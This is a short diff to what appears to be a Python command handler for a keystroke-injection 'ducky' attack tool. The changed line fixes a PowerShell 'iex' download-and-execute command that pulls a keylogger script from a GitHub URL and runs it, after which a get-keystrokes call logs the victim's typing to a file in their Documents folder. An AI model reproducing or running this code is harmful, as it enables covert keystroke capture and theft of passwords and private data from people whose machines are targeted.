@@ -212,7 +212,7 @@ while not stop:
         elif ducky_command[:9] == "keylogger":
             options = [x for x in ducky_command.split(" ")[1:] if x]
             commands = []
-            commands.append("iex ds \"https://raw.githubusercontent.com/computer-geek64/ducky/master/keylogger.ps1\"")
+            commands.append("iex (ds \"https://raw.githubusercontent.com/computer-geek64/ducky/master/keylogger.ps1\")")
             if len(options) > 0:
                 commands.append("get-keystrokes -timeout " + options[0] + " -logpath $env:userprofile\\Documents\\key.log")
             else:
